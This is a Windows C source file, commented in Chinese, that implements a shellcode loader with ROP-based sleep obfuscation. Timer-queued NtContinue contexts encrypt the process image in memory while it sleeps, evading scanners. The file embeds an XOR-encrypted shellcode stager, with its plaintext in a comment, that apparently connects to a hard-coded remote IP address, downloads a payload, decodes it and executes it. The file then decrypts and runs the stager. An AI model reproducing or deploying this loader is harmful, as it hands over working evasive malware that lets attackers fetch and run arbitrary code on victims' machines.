#include"common.h"

typedef struct {
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;


//XOR加解密
void xor_encrypt_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}
VOID ropOb(DWORD SleepTime) {

    //加密前shellcode unsigned char mychar[] = "\xe9\x03\x00\x00\x00\xcc\xcc\xcc\x40\x55\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8d\xac\x24\x08\xfe\xff\xff\x48\x81\xec\xf8\x02\x00\x00\xb9\x4c\x77\x26\x07\xe8\xae\x03\x00\x00\x48\x8b\xd8\xc7\x44\x24\x78\x75\x73\x65\x72\x48\x8d\x4c\x24\x78\xc7\x44\x24\x7c\x33\x32\x2e\x64\x66\xc7\x45\x80\x6c\x6c\xc6\x45\x82\x00\xff\xd3\x48\x8d\x4d\x88\xc7\x45\x88\x77\x73\x32\x5f\xc7\x45\x8c\x33\x32\x2e\x64\x66\xc7\x45\x90\x6c\x6c\xc6\x45\x92\x00\xff\xd3\x48\x8d\x4d\x98\xc7\x45\x98\x6d\x73\x76\x63\xc7\x45\x9c\x72\x74\x2e\x64\x66\xc7\x45\xa0\x6c\x6c\xc6\x45\xa2\x00\xff\xd3\xb9\x29\x80\x6b\x00\xe8\x44\x03\x00\x00\xb9\xea\x0f\xdf\xe0\x48\x8b\xf8\xe8\x37\x03\x00\x00\xb9\x99\xa5\x74\x61\x4c\x8b\xe8\xe8\x2a\x03\x00\x00\xb9\xc2\xeb\x38\x5f\x4c\x8b\xf0\xe8\x1d\x03\x00\x00\xb9\x58\xa4\x53\xe5\x48\x8b\xf0\xe8\x10\x03\x00\x00\xb9\x02\xd9\xc8\x5f\x48\x89\x45\xc0\xe8\x02\x03\x00\x00\xb9\x75\x6e\x4d\x61\x4c\x8b\xf8\xe8\xf5\x02\x00\x00\xb9\xa9\x28\x34\x80\x48\x89\x45\xc8\xe8\xe7\x02\x00\x00\xb9\x12\x1e\x7b\x4d\x48\x89\x45\xb8\xe8\xd9\x02\x00\x00\xb9\x8d\x60\xeb\xd0\x4c\x8b\xe0\xe8\xcc\x02\x00\x00\x48\x8b\xd8\xc7\x44\x24\x70\x77\x36\x34\x20\x33\xc0\x66\xc7\x44\x24\x74\x20\x20\x88\x44\x24\x76\x4c\x8d\x8d\x50\x02\x00\x00\x88\x85\x4c\x02\x00\x00\x88\x85\x54\x02\x00\x00\x88\x85\x5c\x02\x00\x00\x88\x44\x24\x34\x88\x44\x24\x3c\x88\x44\x24\x44\x88\x44\x24\x4c\x88\x44\x24\x54\x88\x44\x24\x60\x88\x44\x24\x6c\x48\x8d\x44\x24\x30\x48\x89\x44\x24\x28\x48\x8d\x85\x58\x02\x00\x00\x48\x89\x44\x24\x20\xc7\x85\x48\x02\x00\x00\x31\x35\x39\x2e\xc7\x85\x50\x02\x00\x00\x37\x35\x2e\x32\xc7\x85\x58\x02\x00\x00\x31\x35\x2e\x31\xc7\x44\x24\x30\x33\x34\x00\x00\xc7\x44\x24\x38\x00\x00\x00\x00\xc7\x44\x24\x40\x00\x00\x00\x00\xc7\x44\x24\x48\x00\x00\x00\x00\xc7\x44\x24\x50\x00\x00\x00\x00\xc7\x44\x24\x58\x25\x73\x25\x73\xc7\x44\x24\x5c\x25\x73\x25\x73\xc7\x44\x24\x68\x25\x73\x25\x73\x4c\x8d\x85\x48\x02\x00\x00\x48\x8d\x54\x24\x58\x48\x8d\x4d\xf0\xff\xd3\x48\x8d\x44\x24\x50\x48\x89\x44\x24\x28\x4c\x8d\x4c\x24\x40\x48\x8d\x44\x24\x48\x4c\x8d\x44\x24\x38\x48\x89\x44\x24\x20\x48\x8d\x54\x24\x58\x48\x8d\x4d\xd0\xff\xd3\x4c\x8d\x4d\xd0\x4c\x8d\x45\xf0\x48\x8d\x54\x24\x68\x48\x8d\x4d\x10\xff\xd3\xb9\x02\x02\x00\x00\x48\x8d\x55\x50\xff\xd7\x85\xc0\x0f\x85\x96\x01\x00\x00\x8d\x50\x01\x45\x33\xc9\x8d\x78\x02\x89\x54\x24\x28\x21\x44\x24\x20\x44\x8d\x40\x06\x8b\xcf\x41\xff\xd5\x48\x8b\xd8\x48\x85\xc0\x0f\x84\x70\x01\x00\x00\x48\x8d\x4d\x10\xc7\x45\xa8\x02\x00\xa0\x14\xff\x55\xb8\x48\x85\xc0\x75\x09\x48\x8d\x4d\x10\x41\xff\xd4\xeb\x09\x48\x8b\x40\x18\x48\x8b\x08\x8b\x01\x89\x45\xac\x41\xbc\x10\x00\x00\x00\xeb\x0b\xb9\x10\x27\x00\x00\xff\x15\xed\x0c\x00\x00\x45\x8b\xc4\x48\x8d\x55\xa8\x48\x8b\xcb\x41\xff\xd6\x85\xc0\x75\xe4\x45\x33\xc9\x44\x8d\x40\x06\x48\x8d\x54\x24\x70\x48\x8b\xcb\xff\xd6\x8a\x45\xaa\x48\x8d\x95\x40\x02\x00\x00\x88\x85\x40\x02\x00\x00\x45\x33\xc9\x0f\xb7\x45\xaa\x44\x8b\xc7\x66\xc1\xe8\x08\x48\x8b\xcb\x88\x85\x41\x02\x00\x00\xff\xd6\x45\x33\xc9\x48\x8d\x95\x48\x02\x00\x00\x48\x8b\xcb\x41\x8d\x79\x04\x44\x8b\xc7\xff\xd6\x45\x33\xc9\x48\x8d\x95\x50\x02\x00\x00\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x95\x58\x02\x00\x00\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x54\x24\x30\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x54\x24\x38\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x54\x24\x40\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x54\x24\x48\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\x45\x33\xc9\x48\x8d\x54\x24\x50\x44\x8b\xc7\x48\x8b\xcb\xff\xd6\xba\x80\xc3\xc9\x01\x44\x8d\x4f\x3c\x33\xc9\x41\xb8\x00\x10\x00\x00\xff\x55\xc0\x48\x8b\xf8\x48\x85\xc0\x74\x44\x33\xf6\x41\xbe\x00\x40\x06\x00\x48\x8b\xd0\xeb\x1e\x45\x33\xc0\x85\xc0\x74\x10\x41\x8d\x0c\x30\x41\xff\xc0\x80\x34\x39\x99\x44\x3b\xc0\x72\xf0\x03\xf0\x8b\xd6\x48\x03\xd7\x45\x33\xc9\x45\x8b\xc6\x48\x8b\xcb\x41\xff\xd7\x83\xf8\x01\x7d\xd1\x48\x8b\xcb\xff\x55\xc8\xff\xd7\x48\x81\xc4\xf8\x02\x00\x00\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\x5d\xc3\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xec\x10\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x8b\xe9\x45\x33\xf6\x48\x8b\x50\x18\x4c\x8b\x42\x10\x4d\x39\x70\x30\x0f\x84\xb7\x00\x00\x00\x4d\x8b\x48\x30\x41\x8b\xd6\x41\x0f\x10\x40\x58\x4d\x8b\x00\x49\x63\x41\x3c\xf3\x0f\x7f\x04\x24\x46\x8b\x9c\x08\x88\x00\x00\x00\x45\x85\xdb\x74\xd1\x48\x8b\x04\x24\x48\xc1\xe8\x10\x66\x44\x3b\xf0\x73\x22\x48\x8b\x4c\x24\x08\x44\x0f\xb7\xd0\x0f\xbe\x01\xc1\xca\x0d\x80\x39\x61\x7c\x03\x83\xc2\xe0\x03\xd0\x48\xff\xc1\x49\x83\xea\x01\x75\xe7\x4f\x8d\x14\x19\x45\x8b\xde\x41\x8b\x7a\x20\x49\x03\xf9\x45\x39\x72\x18\x76\x8d\x8b\x37\x41\x8b\xde\x49\x03\xf1\x48\x8d\x7f\x04\x0f\xbe\x0e\x48\xff\xc6\xc1\xcb\x0d\x03\xd9\x84\xc9\x75\xf1\x8d\x04\x13\x3b\xc5\x74\x0e\x41\xff\xc3\x45\x3b\x5a\x18\x72\xd5\xe9\x5d\xff\xff\xff\x41\x8b\x42\x24\x43\x8d\x0c\x1b\x49\x03\xc1\x0f\xb7\x14\x01\x41\x8b\x4a\x1c\x49\x03\xc9\x8b\x04\x91\x49\x03\xc1\xeb\x02\x33\xc0\x48\x8b\x5c\x24\x20\x48\x8b\x6c\x24\x28\x48\x8b\x74\x24\x30\x48\x8b\x7c\x24\x38\x48\x83\xc4\x10\x41\x5e\xc3\xcc\xcc\xcc";
    //加密后shellcode
    unsigned char mychar[] = "\x42\xa8\xab\xab\xab\x67\x67\x67\xeb\xfe\xf8\xfd\xfc\xea\xff\xea\xfe\xea\xfd\xea\xfc\xe3\x26\x07\x8f\xc3\x56\x54\x54\xe3\x2a\x47\x33\xa8\xab\xab\x12\xe7\xdc\x8d\xac\x43\x85\xaf\xab\xab\x98\x54\x6c\xee\x3b\xde\xd8\xce\xd9\xe3\x20\x73\xeb\x23\xd6\x31\xe3\x26\xe6\x3b\x6c\xee\x3f\x98\x99\x85\xcf\xcd\x6c\xee\x33\xc7\xc7\x54\x78\xe3\x26\xe6\x0b\x6c\xee\x0b\xdc\xd8\x99\xf4\x6c\xee\x0f\x98\x99\x85\xcf\xcd\x6c\xee\x03\xc7\xc7\xeb\x23\xd6\x01\x54\x78\xe3\x26\xe6\x1b\x6c\xee\x1b\xc6\xd8\xdd\xc8\x6c\xee\x1f\xd9\xdf\x85\xcf\xcd\x6c\xee\x13\xc7\xc7\xeb\x23\xd6\x11\x54\x78\x12\x82\x2b\xc0\xab\x43\x6e\xa8\xab\xab\x12\x41\xa4\x74\x4b\xe3\x22\xee\x7b\x43\x1c\xa8\xab\xab\x12\x32\x0e\xdf\xca\xe7\x20\x43\x43\x01\xa8\xab\xab\x12\x69\x40\x93\xf4\xe3\x20\x5b\x43\x36\xa8\xab\xab\x12\xf3\x0f\xf8\x4e\xe3\x20\x53\x43\x3b\xa8\xab\xab\x12\xa9\x72\x63\xf4\xe3\x22\xee\x4b\x43\x29\xa8\xab\xab\x12\xde\xc5\xe6\xca\xe7\x20\x53\x43\xde\xa8\xab\xab\x12\x02\x83\x9f\x2b\xe3\x22\xee\x43\x43\xcc\xa8\xab\xab\x12\xb9\xb5\xd0\xe6\xe3\x22\xee\x73\x43\xf2\xa8\xab\xab\x12\x26\xcb\x40\x7b\xe7\x20\x4b\x43\xe7\xa8\xab\xab\x12\x9a\x51\x59\xdb\xe7\x20\x5b\x43\x94\xa8\xab\xab\x12\x9b\x58\xe2\x4f\xe3\x20\x73\x43\x99\xa8\xab\xab\xe3\x26\xfe\xdb\x12\x2b\xab\xab\xab\x54\x7b\x98\x6b\x6c\xef\x8f\xd3\x8e\xd8\x8e\xd8\x23\xef\x8f\xd5\xe7\x26\xe6\x23\xe3\x26\x2e\x43\xa9\xab\xab\xcd\x6c\xef\x8f\xd7\x8e\xd8\xe7\x26\xee\xdb\xe3\x22\xef\x8f\x8b\xe3\x26\xff\x8f\xd3\x6c\xee\x23\xc7\xc4\xcc\xf4\xe3\x26\xe6\xdb\x6c\xee\x27\xcf\xce\x85\xab\x6c\x2e\x43\xa9\xab\xab\xc7\xc4\xcc\xab\xea\x54\x7d\x98\x79\xe3\x26\xe6\xdb\x54\x78\x98\x70\x2e\x6b\xa4\x2f\x1f\xa9\xab\xab\xe3\x26\xef\x8f\x93\x6c\xee\x2b\xdc\x9d\x9f\x8b\xe3\x22\xef\x8f\x83\xe7\x26\x26\x53\xa9\xab\xab\xe3\x26\xef\x8f\x9b\xcd\x6c\xee\x2f\x8b\x8b\xe7\x26\x2e\x5b\xa9\xab\xab\xe3\x22\xef\x8f\x8b\xe3\x26\xff\x8f\xcb\x23\xf6\x2d\xe3\x26\xe6\xbb\x6c\x2e\x5b\xa9\xab\xab\x98\x92\x85\x9a\x23\x36\x5f\xa9\xab\xab\x6c\x2e\x53\xa9\xab\xab\x9b\x9e\x85\x9a\x23\x36\x57\xa9\xab\xab\x6c\xef\x8f\x9b\x9e\x9c\x85\x99\x23\xf7\x8f\x9f\x6c\xef\x8f\x93\x9b\x9f\xab\xab\x23\xf7\x8f\x97\x6c\xef\x8f\xeb\xab\xab\xab\xab\x23\xf7\x8f\xef\x6c\xef\x8f\xe3\xab\xab\xab\xab\x23\xf7\x8f\xe7\x6c\xef\x8f\xfb\xab\xab\xab\xab\x23\xf7\x8f\xff\x6c\xef\x8f\xf3\xab\xab\xab\xab\x23\xf7\x8f\xf7\x6c\xef\x8f\xcb\x8e\xd8\x8e\xd8\x6c\xef\x8f\xcf\x8e\xd8\x8e\xd8\x23\xf7\x8f\xc3\x6c\xef\x8f\xdb\x8e\xd8\x8e\xd8\x23\xf7\x8f\xdf\xea\x54\x7d\xe3\x26\xef\x8f\xf3\xe3\x22\xef\x8f\x83\xe7\x26\xe7\x8f\xe3\xe3\x26\xef\x8f\xfb\xe7\x26\xef\x8f\xeb\xe3\x22\xef\x8f\x8b\xe3\x26\xff\x8f\xcb\xe3\x26\xe6\x5b\xea\x54\x7d\xe7\x26\xe6\x5b\xe7\x26\xee\xbb\xe3\x26\xff\x8f\xdb\xe3\x26\xe6\x9b\xea\x54\x7d\x12\xa9\xa9\xab\xab\xe3\x26\x3e\x5b\xab\xab\xab\x54\xfe\x7b\x2e\x6b\xa4\x2e\x32\xaa\xab\xab\xef\x26\xd8\xaa\xee\x98\x62\xef\x22\xdf\x8f\x83\xef\x26\xe8\xad\xea\x20\x7d\x22\xf7\x8f\x8b\x26\xe0\xa9\xea\x54\x7e\xe3\x20\x73\xe3\x2e\x6b\xa4\x2f\xdb\xaa\xab\xab\xe3\x26\xe6\x9b\x6c\xee\x6b\xa9\xab\x44\xb7\xee\x26\xc5\xaa\x54\xfe\x73\xe3\x2e\x6b\xde\xa2\xe3\x26\xe6\x9b\xea\x54\x7f\x40\xa2\xe3\x20\xeb\xb3\xe3\x20\xa3\x20\xaa\x22\xee\x6f\xea\x17\xbb\xab\xab\xab\x40\xa0\x12\xbb\x8c\xab\xab\x54\xbe\xc2\xa7\xab\xab\xee\x20\x6f\xe3\x26\xfe\x6b\xe3\x20\x60\x54\x7d\x2e\x6b\xde\x4e\xee\x98\x62\xef\x26\xeb\xad\xe3\x26\xfe\x2b\xe3\x20\x60\x54\x7c\x21\xee\x69\xe3\x26\x3e\x4b\xa9\xab\xab\x23\x2e\x4b\xa9\xab\xab\xee\x98\x62\xa4\x1c\xee\x69\xee\x20\x6e\xcd\x6a\x43\xa3\xe3\x20\x60\x23\x2e\x4a\xa9\xab\xab\x54\x7c\xee\x98\x62\xe3\x26\x3e\x5b\xa9\xab\xab\xe3\x20\x60\xea\x26\xda\xaf\xef\x20\x6d\x54\x7c\xee\x98\x62\xe3\x26\x3e\x53\xa9\xab\xab\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\x9b\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\x93\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\xeb\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\xe3\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\xfb\xef\x20\x6d\xe3\x20\x60\x54\x7c\xee\x98\x62\xe3\x26\xff\x8f\xf3\xef\x20\x6d\xe3\x20\x60\x54\x7c\x11\x2b\x68\x62\xaa\xef\x26\xe5\x97\x98\x62\xea\x13\xab\xbb\xab\xab\x54\xfe\x4b\xe3\x20\x53\xe3\x2e\x6b\xdf\xef\x98\x5d\xea\x17\xab\xeb\xad\xab\xe3\x20\x7b\x40\xb5\xee\x98\x6b\x2e\x6b\xdf\xbb\xea\x26\xa7\x9b\xee\xa8\x6d\x2b\x9f\x92\x32\xef\x90\x6b\xd9\x5b\xa8\x5b\x20\x7d\xe3\xa8\x7c\xee\x98\x62\xee\x20\x6f\xe3\x20\x60\xea\x54\x7c\xea\x90\x6d\xd6\x7a\xe3\x20\x60\x54\xfe\x43\x54\x7c\xe3\x2a\x6f\x33\xa8\xab\xab\xea\xf4\xea\xf5\xea\xf6\xea\xf7\xf4\xf5\xf0\xf6\x68\xe3\x20\x6f\xe3\x22\xf3\xa3\xe3\x22\xc3\xbb\xe3\x22\xdb\xb3\xe3\x22\xd3\x8b\xea\xfd\xe3\x28\x47\xbb\xce\xe3\x20\xaf\x8e\xcb\xab\xab\xab\x20\x42\xee\x98\x5d\xe3\x20\xfb\xb3\xe7\x20\xe9\xbb\xe6\x92\xdb\x9b\xa4\x2f\x1c\xab\xab\xab\xe6\x20\xe3\x9b\xea\x20\x7d\xea\xa4\xbb\xeb\xf3\xe6\x20\xab\xe2\xc8\xea\x97\x58\xa4\xd4\xaf\x8f\xed\x20\x37\xa3\x23\xab\xab\xab\xee\x2e\x70\xdf\x7a\xe3\x20\xaf\x8f\xe3\x6a\x43\xbb\xcd\xef\x90\x5b\xd8\x89\xe3\x20\xe7\x8f\xa3\xef\xa4\x1c\x7b\xa4\x15\xaa\x6a\x61\xa6\x2b\x92\xca\xd7\xa8\x28\x69\x4b\xa8\x7b\xe3\x54\x6a\xe2\x28\x41\xaa\xde\x4c\xe4\x26\xbf\xb2\xee\x20\x75\xea\x20\xd1\x8b\xe2\xa8\x52\xee\x92\xd9\xb3\xdd\x26\x20\x9c\xea\x20\x75\xe2\xa8\x5a\xe3\x26\xd4\xaf\xa4\x15\xa5\xe3\x54\x6d\x6a\x60\xa6\xa8\x72\x2f\x62\xde\x5a\x26\xaf\xb8\x90\x6e\xdf\xa5\xea\x54\x68\xee\x90\xf1\xb3\xd9\x7e\x42\xf6\x54\x54\x54\xea\x20\xe9\x8f\xe8\x26\xa7\xb0\xe2\xa8\x6a\xa4\x1c\xbf\xaa\xea\x20\xe1\xb7\xe2\xa8\x62\x20\xaf\x3a\xe2\xa8\x6a\x40\xa9\x98\x6b\xe3\x20\xf7\x8f\x8b\xe3\x20\xc7\x8f\x83\xe3\x20\xdf\x8f\x9b\xe3\x20\xd7\x8f\x93\xe3\x28\x6f\xbb\xea\xf5\x68\x67\x67\x67";
    size_t size = sizeof(mychar);
    size_t len = sizeof(mychar) - 1;

    unsigned char key = 0xAB; // 定义XOR密钥
    
    DWORD shellcodeSize = sizeof(mychar);
    DWORD   OldProtect = 0;

    PVOID ImageBase = GetModuleHandle(NULL);
    DWORD ImageSize = ((PIMAGE_NT_HEADERS)((DWORD64)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)ImageBase;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)ImageBase + DOS_HEADER->e_lfanew);
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);

    LPVOID txtSectionBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)SECTION_HEADER->PointerToRawData);
    DWORD txtSectionSize = SECTION_HEADER->SizeOfRawData;

    LPVOID reapplyBase = NULL;
    DWORD reapplySize = 0;


    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {
        if (!strcmp(".reloc", (const char*)SECTION_HEADER->Name)) {
            reapplyBase = (LPVOID)((DWORD64)ImageBase + (DWORD64)SECTION_HEADER->PointerToRawData);
            reapplySize = SECTION_HEADER->SizeOfRawData;
        }
        SECTION_HEADER++;
    }


    DWORD CryptSize = ImageSize - (DWORD)((DWORD)txtSectionBase - (DWORD)ImageBase)
        - (ImageSize - ((DWORD)reapplyBase - (DWORD)ImageBase)) + reapplySize;


    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopExecuteShellcode = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    HANDLE  hEvent = NULL;

    //内存加密
    CHAR KeyBuf[16];
    unsigned int r = 0;
    for (int i = 0; i < 16; i++) {
        rand_s(&r); // r between UINT_MIN & UINT_MAX
        KeyBuf[i] = (CHAR)r;

    }

    USTRING Key = { 0 };
    USTRING Img = { 0 };

    PVOID   NtContinue = NULL;
    PVOID   SysFunc032 = NULL;

    hEvent = CreateEventW(0, 0, 0, 0);
    hTimerQueue = CreateTimerQueue();

    NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");
    SysFunc032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");


    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = txtSectionBase;
    Img.Length = Img.MaximumLength = CryptSize;

    DWORD oldProtect;
    if (!VirtualProtect(mychar, sizeof(mychar), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection\n");
        return;
    }

    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        WaitForSingleObject(hEvent, 0x32);

        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopDelay, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopExecuteShellcode, &CtxThread, sizeof(CONTEXT));

        //VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD64)VirtualProtect;
        RopProtRW.Rcx = (DWORD64)ImageBase;
        RopProtRW.Rdx = ImageSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = (DWORD64)&OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp -= 8;
        RopMemEnc.Rip = (DWORD64)SysFunc032;
        RopMemEnc.Rcx = (DWORD64)&Img;
        RopMemEnc.Rdx = (DWORD64)&Key;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp -= 8;
        RopDelay.Rip = (DWORD64)WaitForSingleObject;
        RopDelay.Rcx = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx = SleepTime;

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp -= 8;
        RopMemDec.Rip = (DWORD64)SysFunc032;
        RopMemDec.Rcx = (DWORD64)&Img;
        RopMemDec.Rdx = (DWORD64)&Key;


        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD64)VirtualProtect;
        RopProtRX.Rcx = (DWORD64)ImageBase;
        RopProtRX.Rdx = ImageSize;
        RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9 = (DWORD64)&OldProtect;

        //解密shellcode
        RopExecuteShellcode.Rsp -= 8;
        RopExecuteShellcode.Rip = (DWORD64)xor_encrypt_decrypt;
        unsigned char* shellcode = mychar;
        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)mychar; //shellcode

        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)len; //length

        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)key; //key

        // 执行解密后的 shellcode
        RopExecuteShellcode.Rsp -= 8;
        *((DWORD64*)RopExecuteShellcode.Rsp) = (DWORD64)(RopExecuteShellcode.Rip + 16); // 返回地址，指向解密后的 shellcode
        RopExecuteShellcode.Rip = (DWORD64)shellcode;


        RopExecuteShellcode.Rsp -= 8;
        RopExecuteShellcode.Rip = (DWORD64)mychar;
        printf("\b%p", RopExecuteShellcode.Rip);

        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip = (DWORD64)SetEvent;
        RopSetEvt.Rcx = (DWORD64)hEvent;

        puts("\n[INFO] Queue timers\n");

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 700, 0, WT_EXECUTEINTIMERTHREAD);

        puts("\n[INFO] Wait for hEvent\n");
        WaitForSingleObject(hEvent, INFINITE);

        puts("\n[INFO] Finished waiting for event\n");
        xor_encrypt_decrypt(mychar, len, key);
        ((void(*)())RopExecuteShellcode.Rip)();
    }
    // delete the timerQueue
    DeleteTimerQueue(hTimerQueue);
}

